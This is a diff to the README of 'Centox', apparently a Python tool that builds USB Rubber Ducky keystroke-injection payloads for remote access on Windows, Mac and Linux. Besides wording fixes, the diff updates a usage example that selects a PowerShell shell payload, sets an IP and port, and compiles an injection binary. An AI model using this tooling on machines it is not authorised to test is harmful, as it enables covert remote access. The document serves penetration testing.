@@ -10,9 +10,8 @@ Centox is an injection handler written in python3 and is designed to provide a c
 payloads written for the [USB Rubber ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe/)
 which was designed by [Hak5](https://shop.hak5.org/). This project contains payloads designed for 
 establishing remote access, deploying and running executables and more in as short time as possible.
-Centox comes with payloads designed Windows, Mac and Linux with the assumption that the target has not
-modified their default shortcuts.
-
+Centox comes with payloads designed for Windows, Mac and Linux with the assumption that the target has
+not modified their default shortcuts.
 
 ## Disclaimer
 
@@ -56,25 +55,31 @@ help       shows this help message
 how to generate payloads:
 ```
 [Centox] $ use windows/shell/powershell
- 
+
 [Centox] $ options
- 
+
  Payload: windows/shell/powershell
- 
-Argument       Value
--------------  -------
-start_delay    500
+
+Global Argument       Value
+--------------------  -------
+typing_delay_average
+typing_delay_offset   25
+
+Payload Argument    Value
+------------------  -------
+start_delay         500
 ip
 port
-windows_admin  false
- 
+windows_admin       false
+
 [Centox] $ set ip 192.168.68.42
- 
+
 [Centox] $ set port 9999
- 
+
 [Centox] $ generate -o /home/user/inject.bin -l no
-[*] created temporary folder -> /tmp/tmpfeccetz0
-[*] writing raw payload to -> /tmp/tmpfeccetz0/payload
+[*] created temporary folder -> /tmp/tmpti0d_l1u
+[*] converting payload to format: ducky
+[*] writing raw payload to -> /tmp/tmpti0d_l1u/payload
 [*] compiling payload to injection binary...
 [*] injection compiled successfully -> /home/user/inject.bin
 ```
